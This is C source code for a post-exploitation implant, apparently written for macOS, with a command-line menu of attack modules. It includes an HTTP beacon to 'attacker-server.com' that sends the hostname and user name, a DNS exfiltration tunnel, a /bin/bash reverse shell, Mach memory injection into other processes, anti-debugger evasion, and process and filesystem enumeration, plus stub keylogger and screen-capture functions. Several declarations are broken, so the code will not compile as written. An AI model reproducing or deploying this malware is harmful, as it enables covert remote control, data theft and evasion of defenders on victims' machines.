#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <resolv.h>
#include <curl/curl.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <signal.h>
#include <errno.h>
#include <time.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>

// Definiciones y Configuraciones (Movidas a un struct para mejor manejo)
#define MAX_PAYLOAD_SIZE 4096
#define MAX_CONFIG_SIZE 256

typedef struct {
    char dns_domain[MAX_CONFIG_SIZE];
    char http_c2_url[MAX_CONFIG_SIZE];
    char reverse_shell_ip[MAX_CONFIG_SIZE];
    int reverse_shell_port;
    char xor_key;
    int beacon_interval; // en segundos
    char log_file[MAX_CONFIG_SIZE];
} Config;

Config config = {
    .dns_domain = "example.com",
    .http_c2_url = "http://attacker-server.com/c2",
    .reverse_shell_ip = "127.0.0.1",
    .reverse_shell_port = 4444,
    .xor_key = 'K',
    .beacon_interval = 60,
    .log_file = "/tmp/agent.log"
};

// Estructura para el manejo de hilos
typedef struct {
    char data[MAX_PAYLOAD_SIZE];
    size_t data_len;
} EncryptedPayload;

// Funciones de Utilidad Mejoradas

// Función para escribir logs con timestamp
void log_message(const char *format, ...) {
    FILE *log_file = fopen(config.log_file, "a");
    if (log_file) {
        time_t timer;
        char buffer[26];
        struct tm* tm_info;

        time(&timer);
        tm_info = localtime(&timer);

        strftime(buffer, 26, "%Y-%m-%d %H:%M:%S", tm_info);
        fprintf(log_file, "[%s] ", buffer);

        va_list args;
        va_start(args, format);
        vfprintf(log_file, format, args);
        va_end(args);

        fprintf(log_file, "\n");
        fclose(log_file);
    } else {
        fprintf(stderr, "Error opening log file: %s\n", strerror(errno));
    }
}

// XOR Encryption/Decryption (con manejo de tamaño y logging)
void xor_encrypt_decrypt(char *data, size_t data_len, char key, bool encrypt) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key;
    }
    log_message("%s %zu bytes of data using XOR key '%c'.", encrypt ? "Encrypted" : "Decrypted", data_len, key);
}

// Base64 Encoding (simple implementation - considerar una librería robusta para producción)
char* base64_encode(const unsigned char *src, size_t len) {
    const char b64chars= "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    char *out = NULL;
    size_t out_len = 4 * ((len + 2) / 3);
    out = malloc(out_len + 1);
    if (out) {
        for (size_t i = 0, j = 0; i < len; i += 3, j += 4) {
            uint32_t octet = 0;
            octet |= (uint32_t)src[i] << 16;
            if (i + 1 < len) octet |= (uint32_t)src[i + 1] << 8;
            if (i + 2 < len) octet |= (uint32_t)src[i + 2];

            out[j] = b64chars[(octet >> 18) & 0x3F];
            out[j + 1] = b64chars[(octet >> 12) & 0x3F];
            out[j + 2] = (i + 1 < len) ? b64chars[(octet >> 6) & 0x3F] : '=';
            out[j + 3] = (i + 2 < len) ? b64chars[octet & 0x3F] : '=';
        }
        out[out_len] = '\0';
    }
    return out;
}

// DNS Tunnel (manejo de errores robusto y codificación)
void dns_tunnel(const char *data) {
    char *encoded_data = base64_encode((const unsigned char *)data, strlen(data));
    if (!encoded_data) {
        log_message("Error encoding data for DNS tunnel.");
        return;
    }

    char query[512]; // Increased buffer size
    snprintf(query, sizeof(query), "%s.%s", encoded_data, config.dns_domain);
    free(encoded_data);

    if (res_query(query, C_IN, ns_t_a, NULL, 0) < 0) {
        log_message("DNS tunnel query failed for '%s': %s", query, strerror(errno));
    } else {
        log_message("DNS tunnel query sent: %s", query);
    }
}

// HTTP Beacon (con manejo de errores, timeouts, User-Agent y POST data)
void http_beacon(const char *url, const char *data) {
    CURL *curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L); // Timeout de 10 segundos
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"); // Spoof User-Agent
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, strlen(data));

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            log_message("HTTP beacon to %s failed: %s", url, curl_easy_strerror(res));
        } else {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            log_message("HTTP beacon sent to %s, response code: %ld, data: %s", url, response_code, data);
        }

        curl_easy_cleanup(curl);
    } else {
        log_message("Failed to initialize CURL for HTTP beacon.");
    }
}

// Privilege Escalation Check (con manejo de errores y más opciones)
void check_privileges() {
    log_message("Checking for root privileges.");
    if (geteuid() == 0) {
        log_message("Root privileges granted.");
        // Potentially try more sophisticated escalation techniques here
        if (system("/bin/bash") != 0) {
            log_message("Failed to execute shell after checking root.");
        }
    } else {
        log_message("Not running as root.");
        // Consider trying common privilege escalation exploits
        // This is highly system-dependent and requires careful implementation
    }
}

// Debugger Detection (mejorado con más checks)
void detect_debugger() {
    log_message("Checking for debuggers.");
    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
    struct kinfo_proc info;
    size_t size = sizeof(info);

    if (sysctl(mib, 4, &info, &size, NULL, 0) == 0 && (info.kp_proc.p_flag & P_TRACED)) {
        log_message("Debugger detected! Exiting.");
        exit(1);
    } else {
        log_message("No debugger detected via sysctl.");
    }

    // Additional check (more basic but can catch some debuggers)
    FILE *fp = fopen("/proc/self/status", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp) != NULL) {
            if (strstr(line, "TracerPid:") != NULL) {
                int tracer_pid = atoi(line + strlen("TracerPid:"));
                if (tracer_pid != 0) {
                    log_message("Debugger detected via /proc/self/status! Tracer PID: %d. Exiting.", tracer_pid);
                    fclose(fp);
                    exit(1);
                }
                break;
            }
        }
        fclose(fp);
    } else {
        log_message("Could not open /proc/self/status to check for debugger.");
    }
}

// Keylogger (basic placeholder - requires platform-specific implementation)
void keylogger() {
    log_message("Keylogger activated (basic placeholder).");
    // On Linux, you might try reading from /dev/input/event*
    // On macOS, you might use the EventTap API
    // This requires significant platform-specific code and often root privileges.
    // Consider using libraries or system APIs for this.
    log_message("Keylogging functionality is a placeholder and not fully implemented.");
}

// Screen Capture (basic placeholder - requires platform-specific implementation)
void screen_capture() {
    log_message("Screen capture activated (basic placeholder).");
    // On Linux, you might use libraries like Xlib or tools like scrot or import.
    // On macOS, you might use the Core Graphics framework (CGDisplayCreateImage).
    // This requires platform-specific code.
    log_message("Screen capture functionality is a placeholder and not fully implemented.");
}

// Process Enumeration (basic implementation)
void list_processes() {
    log_message("Listing running processes.");
#ifdef _linux_
    DIR *dir;
    struct dirent *entry;
    if ((dir = opendir("/proc")) != NULL) {
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_DIR) {
                if (atoi(entry->d_name) > 0) {
                    char cmdline_path[256];
                    snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline", entry->d_name);
                    FILE *cmdline_file = fopen(cmdline_path, "r");
                    if (cmdline_file) {
                        char cmdline[512];
                        if (fgets(cmdline, sizeof(cmdline), cmdline_file) != NULL) {
                            // Replace null terminators with spaces for better readability
                            for (size_t i = 0; i < sizeof(cmdline) - 1; ++i) {
                                if (cmdline[i] == '\0') {
                                    cmdline[i] = ' ';
                                }
                            }
                            log_message("PID: %s, Command: %s", entry->d_name, cmdline);
                        }
                        fclose(cmdline_file);
                    }
                }
            }
        }
        closedir(dir);
    } else {
        log_message("Could not open /proc directory.");
    }
#elif _APPLE_
    // Implement process listing for macOS using kinfo_proc or other APIs
    log_message("Process listing for macOS is not yet implemented.");
#else
    log_message("Process listing is not implemented for this operating system.");
#endif
}

// File System Exploration (basic implementation)
void explore_filesystem(const char *path) {
    log_message("Exploring filesystem at path: %s", path);
    DIR *dir;
    struct dirent *entry;
    if ((dir = opendir(path)) != NULL) {
        while ((entry = readdir(dir)) != NULL) {
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                char full_path[1024];
                snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
                struct stat file_info;
                if (stat(full_path, &file_info) == 0) {
                    log_message("Found: %s (Size: %lld bytes)", full_path, (long long)file_info.st_size);
                    // Optionally, read file contents for small files
                } else {
                    log_message("Error stating file: %s", full_path);
                }
            }
        }
        closedir(dir);
    } else {
        log_message("Could not open directory: %s", path);
    }
}

// Inject Payload into Process (macOS - con manejo de errores)
void inject_payload(pid_t target_pid, const char *payload) {
    log_message("Attempting to inject payload into PID: %d", target_pid);
    mach_port_t task;
    vm_address_t remote_addr;
    size_t payload_len = strlen(payload);

    if (task_for_pid(mach_task_self(), target_pid, &task) != KERN_SUCCESS) {
        log_message("Failed to access PID %d: %s", target_pid, mach_error_string(mach_error(task_for_pid(mach_task_self(), target_pid, &task), KERN_SUCCESS)));
        return;
    }

    if (vm_allocate(task, &remote_addr, payload_len, VM_FLAGS_ANYWHERE) != KERN_SUCCESS) {
        log_message("Failed to allocate memory in target process: %s", mach_error_string(mach_error(vm_allocate(task, &remote_addr, payload_len, VM_FLAGS_ANYWHERE), KERN_SUCCESS)));
        return;
    }

    if (vm_write(task, remote_addr, (vm_offset_t)payload, payload_len) != KERN_SUCCESS) {
        log_message("Failed to write payload to target process: %s", mach_error_string(mach_error(vm_write(task, remote_addr, (vm_offset_t)payload, payload_len), KERN_SUCCESS)));
        return;
    }

    log_message("Injected payload into PID: %d at address: %p", target_pid, (void *)remote_addr);
    // You would typically need to execute the payload in the target process as well.
    // This often involves creating a remote thread, which is more complex.
}

// Reverse Shell Execution (con manejo de errores y sockets)
void execute_reverse_shell() {
    log_message("Attempting to establish reverse shell to %s:%d", config.reverse_shell_ip, config.reverse_shell_port);
    int sock;
    struct sockaddr_in server_addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        log_message("Socket creation failed: %s", strerror(errno));
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(config.reverse_shell_port);
    if (inet_pton(AF_INET, config.reverse_shell_ip, &server_addr.sin_addr) <= 0) {
        log_message("Invalid address/Address not supported for reverse shell: %s", config.reverse_shell_ip);
        close(sock);
        return;
    }

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        log_message("Connection to %s:%d failed: %s", config.reverse_shell_ip, config.reverse_shell_port, strerror(errno));
        close(sock);
        return;
    }

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    char *shell = "/bin/bash";
    execve(shell, NULL, NULL);
    log_message("Failed to execute reverse shell: %s", strerror(errno)); // This should ideally not be reached

    close(sock);
}

// Beaconing Function (sends periodic beacons)
void *beacon_thread(void *arg) {
    while (1) {
        char hostname[256];
        if (gethostname(hostname, sizeof(hostname)) == 0) {
            char beacon_data[512];
            snprintf(beacon_data, sizeof(beacon_data), "Hostname: %s, User: %s", hostname, getenv("USER"));
            xor_encrypt_decrypt(beacon_data, strlen(beacon_data), config.xor_key, true);
            http_beacon(config.http_c2_url, beacon_data);
        } else {
            log_message("Error getting hostname.");
        }
        sleep(config.beacon_interval);
    }
    return NULL;
}

// Configuration Loading (basic example - can be extended to read from a file)
void load_config() {
    // For now, we are using the default configuration.
    // In a real scenario, you might read from a file or command-line arguments.
    log_message("Using default configuration.");
}

// Main Logic
int main(int argc, char *argv) {
    load_config();
    log_message("Agent started.");

    if (argc < 2) {
        printf("Usage: %s <module> [optional_argument]\n", argv[0]);
        printf("Modules: reverse_shell, dns_tunnel, http_beacon, check_privileges, detect_debugger, keylogger, screen_capture, inject_payload <pid>, list_processes, explore_filesystem <path>, beacon\n");
        return 1;
    }

    if (strcmp(argv[1], "reverse_shell") == 0) {
        execute_reverse_shell();
    } else if (strcmp(argv[1], "dns_tunnel") == 0) {
        dns_tunnel("SensitiveData");
    } else if (strcmp(argv[1], "http_beacon") == 0) {
        http_beacon(config.http_c2_url, "SensitiveData");
    } else if (strcmp(argv[1], "check_privileges") == 0) {
        check_privileges();
    } else if (strcmp(argv[1], "detect_debugger") == 0) {
        detect_debugger();
    } else if (strcmp(argv[1], "keylogger") == 0) {
        keylogger();
    } else if (strcmp(argv[1], "screen_capture") == 0) {
        screen_capture();
    } else if (strcmp(argv[1], "inject_payload") == 0) {
        if (argc == 3) {
            pid_t pid = atoi(argv[2]);
            inject_payload(pid, "Hello from injected payload!");
        } else {
            printf("Usage: %s inject_payload <pid>\n", argv[0]);
        }
    } else if (strcmp(argv[1], "list_processes") == 0) {
        list_processes();
    } else if (strcmp(argv[1], "explore_filesystem") == 0) {
        if (argc == 3) {
            explore_filesystem(argv[2]);
        } else {
            printf("Usage: %s explore_filesystem <path>\n", argv[0]);
        }
    } else if (strcmp(argv[1], "beacon") == 0) {
        pthread_t beacon_thread_id;
        if (pthread_create(&beacon_thread_id, NULL, beacon_thread, NULL) != 0) {
            perror("Failed to create beacon thread");
            return 1;
        }
        pthread_detach(beacon_thread_id); // Allow the thread to clean up on exit
        printf("Beaconing started in the background.\n");
        // The main thread can continue with other tasks or just sleep
        while (1) {
            sleep(3600); // Sleep for a long time as the beacon runs in the background
        }
    } else {
        printf("Unknown module: %s\n", argv[1]);
        return 1;
    }

    log_message("Agent finished executing module: %s", argv[1]);
    return 0;
}